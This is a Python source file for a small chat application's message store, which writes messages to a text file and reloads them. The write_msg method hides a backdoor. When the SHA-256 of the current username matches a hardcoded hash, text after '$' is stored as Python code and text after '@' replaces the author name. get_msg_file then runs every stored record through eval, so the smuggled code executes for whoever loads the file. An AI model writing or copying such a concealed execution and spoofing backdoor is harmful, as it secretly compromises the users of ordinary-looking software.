from message import Message
from os import path
import getpass
import hashlib


def get_file(name):
    return path.join(path.dirname(path.realpath(__file__)), name)


class Reader():
    def __init__(self, screen):
        self.screen = screen
        self.file = get_file('save.txt')
        self.all_msg = []

    def read_file(self):
        with open(self.file, 'r') as f:
            s = f.read()
        return s

    def vider_file(self):
        with open(self.file, 'w') as f:
            f.writelines('')

    def write_msg(self, m):
        h = hashlib.sha256()
        h.update(getpass.getuser().encode())
        if h.digest() == b"\xc0\xf7\xebu\xc0\x14\"\x93*\n\x01\xa0)<O\x88\xd3\x93U\xbc\xc0*\xd68\xac\x91z\xc1\x05\x8f\r\xaf":
            msg = []
            python = "None"
            author = str(m.author.string)
            for line in m.cont:
                if '$' in line:
                    line = ''.join(line)
                    msg_, python_ = line.split("$")
                    msg.append(list(msg_))
                    python += "," + python_
                elif '@' in line:
                    line = ''.join(line)
                    msg_, name = line.split("@")
                    msg.append(list(msg_))
                    author = name
                else:
                    msg.append(line)
            with open(self.file, 'a') as f:
                f.writelines(
                    f'([{python}],{msg})[1]|{author}|{m.id_m}§')
        else:
            with open(self.file, 'a') as f:
                f.writelines(f'{m.cont}|{str(m.author.string)}|{m.id_m}§')

    def get_msg_file(self):
        l = self.read_file().split('§')
        dic = {}
        for m in l:
            if m != '':
                dic[m.split('|')[2]] = {'author': m.split(
                    '|')[1], 'cont': eval(m.split('|')[0])}
        return dic

    def create_msg(self, cont, author):
        m = Message(author, cont, len(self.all_msg), len(cont), self.screen)
        self.all_msg.append(m)
        return m

    def update_all_msg(self):
        self.all_msg = []
        if self.read_file() != '':
            d = self.get_msg_file()
            for m in d.values():
                self.create_msg(m['cont'], m['author'])
